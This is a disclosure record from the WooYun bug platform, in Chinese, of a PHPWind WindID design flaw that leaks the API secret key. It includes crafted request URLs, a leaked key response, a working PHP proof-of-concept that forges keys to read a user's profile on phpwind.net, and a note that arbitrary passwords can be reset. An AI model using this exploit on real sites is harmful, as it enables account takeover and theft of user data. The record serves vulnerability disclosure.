{"id": 18, "wybug_id": "wooyun-2014-072727", "wybug_title": "一个PHPWIND可拿shell的高危漏洞", "wybug_corp": "phpwind", "wybug_author": "Map", "wybug_date": "2014-08-17 07:13", "wybug_open_date": "2014-11-15 07:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向公众公开  简要描述： 如题。 详细说明：  没想到PHPWIND犯了一个和PHPCMS一样的漏洞。在src/applications/windidserver/api/controller/AppController.php内代码：\npublic function listAction() {\t\t$result = $this->_getAppDs()->getList();\t\t$this->output($result);\t}\n如何获取可以访问接口的key？查看用户上传头像页面就可以知道了：/phpwind/src/windid/service/user/srv/WindidUserService.php内的代码：\n$key = WindidUtility::appKey($appId, $time, $appKey, array('uid'=>$uid, 'type'=>'flash'), array('uid'=>'undefined'));……\n去头像页面查看一下源文件http://localhost/phpwind/index.php?m=profile&c=avatar&_left=avatar\n\n解出urldecode得：http://localhost/phpwind/windid/index.php?m=api&c=avatar&a=doAvatar&uid=1&windidkey=f5b35f56c88695b9069e18ecaafad874&time=1408197299&clientid=1&type=flash&avatar=http://localhost/phpwind/windid/attachment/avatar/000/00/00/1.jpg?r=88418去掉&avatar=http://localhost/phpwind/windid/attachment/avatar/000/00/00/1.jpg?r=88418然后记得，还需要POST一个uid等于undefined把doAvatar换成list,avatar换成app得：http://localhost/phpwind/windid/index.php?m=api&c=app&a=list&uid=1&windidkey=f5b35f56c88695b9069e18ecaafad874&time=1408197299&clientid=1&type=flashPOST：uid=undefined得：{\"1\":{\"id\":\"1\",\"name\":\"phpwind9.0\",\"siteurl\":\"http:\\/\\/localhost\\/phpwind\",\"siteip\":\"\",\"secretkey\":\"73e3dcdd733c7c3733c17273a624e162\",\"apifile\":\"windid.php\",\"charset\":\"gbk\",\"issyn\":\"1\",\"isnotify\":\"1\"}}\n\n拿到这个key，我可以做的事情太多了，用户体系内的所有事情我都可以做了。   漏洞证明：  \n\n拿到这个key，我可以做的事情太多了，用户体系内的所有事情我都可以做了。在官网测试了一下，拿到key后测试一下读取一个用户的资料：\n<?php$secretkey = '308c6c43a*****279dd61dd80e8d59bd';$c = 'user';$a = 'get';$data = array('uid'=>'658925');$time = time();$key = appKey('1', time(), $secretkey, array('userid'=>658925), $data);echo post('http://www.phpwind.net/windid/index.php?m=api&c='.$c.'&a='.$a.'&windidkey='.$key.'&time='.$time .'&clientid=1&userid=658925',$data);function post($uri,$data) {\t$ch = curl_init ();\tcurl_setopt ( $ch, CURLOPT_URL, $uri );\tcurl_setopt ( $ch, CURLOPT_POST, 1 );\tcurl_setopt ( $ch, CURLOPT_HEADER, 0 );\tcurl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );\tcurl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );\t$return = curl_exec ( $ch );\tcurl_close ( $ch );\treturn $return;}function appKey($apiId, $time, $secretkey, $get, $post) {\t$array = array('m', 'c', 'a', 'windidkey', 'clientid', 'time', '_json', 'jcallback', 'csrf_token', 'Filename', 'Upload', 'token');\t$str = '';\tksort($get);\tksort($post);\tforeach ($get AS $k=>$v) {\t\tif (in_array($k, $array)) continue;\t\t$str .=$k.$v;\t}\tforeach ($post AS $k=>$v) {\t\tif (in_array($k, $array)) continue;\t\t$str .=$k.$v;\t}\treturn md5(md5($apiId.'||'.$secretkey).$time.$str);\t\t}?>\n\n\n{\"uid\":\"658925\",\"username\":\"phpwind\",\"email\":\"fengyu@phpwind.net\",\"safecv\":\"5b4111de\",\"regdate\":\"1143101940\",\"regip\":\"\"}在User的api内还有一个edit的接口，可以修改任意用户的密码，调用它，不填写old_password，将可以修改任意用户的密码，不会验证原密码的。   修复方案：  不要轻信key，可以将m，a，c都加入key的运算。   版权声明：转载请注明来源 Map@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-08-19 17:03 厂商回复： 亲，感谢您的关注和支持，该漏洞我们正在修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-17 11:32 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  这么安静。    \n     2014-08-17 11:44 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  看标题，不明觉厉啊。    \n     2014-08-17 11:51 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @猪猪侠 标题被改了。    \n     2014-08-17 14:09 |    \t\tblue  \t\t\t( 普通白帽子  |\t\t\t        Rank:779 漏洞数:70        | 我心中有猛虎，细嗅蔷薇。)\t\t \n  楼主厉害的不成样子，必须是身高八尺，胸围也是八尺的真汉子    \n     2014-08-17 16:18 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @blue 蓝哥……    \n     2014-08-18 10:25 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  好久不见phpwind了    \n     2014-08-18 15:04 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @疯狗 狗哥，下午有了点时间我刚更新了一下这个漏洞的信息方便厂家修复，你能帮忙通过审核一下么。    \n     2014-08-19 17:10 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  我操，前排都抢不到了    \n     2014-08-19 17:18 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  好在漏洞到了时间是会对外公开的，这是一个我挺喜欢的漏洞。    \n     2014-08-19 17:25 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  膜拜洞主    \n     2014-08-19 17:27 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @Map 敢问洞主师从何处    \n     2014-08-19 18:03 |    \t\t小九 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 非尖刀小九,民间草根)\t\t \n  一堆小电影网站要倒霉了    \n     2014-08-19 18:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  又是1w的节奏啊    \n     2014-08-19 18:43 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  哎，走了XX流程，前台都看不到，悲剧！@xsser    \n     2014-08-19 19:00 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  留个名    \n     2014-08-19 21:12 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  不明觉厉    \n     2014-08-21 14:34 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  坐等此洞放出，又死一片    \n     2014-08-21 17:47 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @Map 发现洞主喜欢挑战一些高难度的建站程序，期待下次你发个帝国cms的高危漏洞    \n     2014-08-22 17:57 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  @猪猪侠 你是传说中的猪猪侠吗？    \n     2014-08-22 21:35 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @贫道来自河北 挑衅    \n     2014-08-22 21:57 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @xsser 俺就是想知道帝国cms到底有漏洞没    \n     2014-08-24 23:12 |    \t\t李白 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:29        )\t\t \n  @贫道来自河北 挑衅    \n     2014-08-24 23:31 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @李白 诗仙  你特马得把我吓哭了    \n     2014-08-24 23:33 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @贫道来自河北 @李白 两位道友好    \n     2014-08-25 00:13 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @roker 大牛好久，是不是最近有大动作啊    \n     2014-08-27 10:10 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  必须关注啊    \n     2014-09-20 13:18 |    \t\t风花雪月 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:44        | []+[]|[]-[][][][][]%[][]|[]\\[]%[][]|[]\\[...)\t\t \n  火拉拉  我看不到啊！！    \n     2014-11-15 10:09 |    \t\t闭关修炼 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:11        | 学习黑客技术是一种信仰。只有不断的突破。...)\t\t \n  支持一下，    \n     2015-03-04 13:25 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  真屌。。。。。    \n     2015-04-02 19:36 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  简直溜    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}